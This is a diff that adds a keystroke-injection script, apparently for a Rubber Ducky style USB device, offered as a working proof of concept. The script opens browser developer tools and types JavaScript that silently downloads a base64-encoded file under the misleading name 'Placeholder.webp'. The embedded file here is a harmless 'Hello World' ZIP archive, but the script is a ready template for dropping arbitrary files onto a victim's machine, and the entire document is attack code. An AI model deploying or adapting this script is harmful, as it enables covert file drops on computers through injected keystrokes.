@@ -1,0 +1,39 @@
+REM Credit John-Hickens
+REM A small working PoC
+DELAY 400
+CTRL-SHIFT I
+DELAY 1000
+SHIFT TAB 
+DELAY 1000
+TAB
+DELAY 3000
+STRING function Base64toBytes(base64Data){ var binary_vals = atob(base64Data);var binary_len = binary_vals.length;var bytes_data = new Uint8Array(binary_len);for(i = 0; i < binary_len; i++){bytes_data[i] = binary_vals.charCodeAt(i);}return bytes_data.buffer}
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000 
+ENTER
+DELAY 1000
+STRING var filename = "Placeholder.webp";
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+STRING var filedata = "UEsDBBQAAAAAAA2hgVVWsRdKCwAAAAsAAAAPAAAASGVsbG8gV29ybGQudHh0SGVsbG8gV29ybGRQSwECFAAUAAAAAAANoYFVVrEXSgsAAAALAAAADwAAAAAAAAABACAAAAAAAAAASGVsbG8gV29ybGQudHh0UEsFBgAAAAABAAEAPQAAADgAAAAAAA=="
+DELAY 4000
+ENTER
+DELAY 5000
+ENTER
+DELAY 3000
+STRING var file_bytes = Base64toBytes(filedata);var blob = new Blob([file_bytes], {"type":"octet/stream"});var anchor = document.createElement("a");document.body.append(anchor);anchor.style = "display: none;";var url = window.URL.createObjectURL(blob);anchor.href = url;anchor.download = filename;anchor.click();window.URL.revokeObjectURL(url);
+DELAY 1000
+ENTER
+DELAY 2000
+ENTER
+DELAY 1000
+ENTER
+DELAY 2000
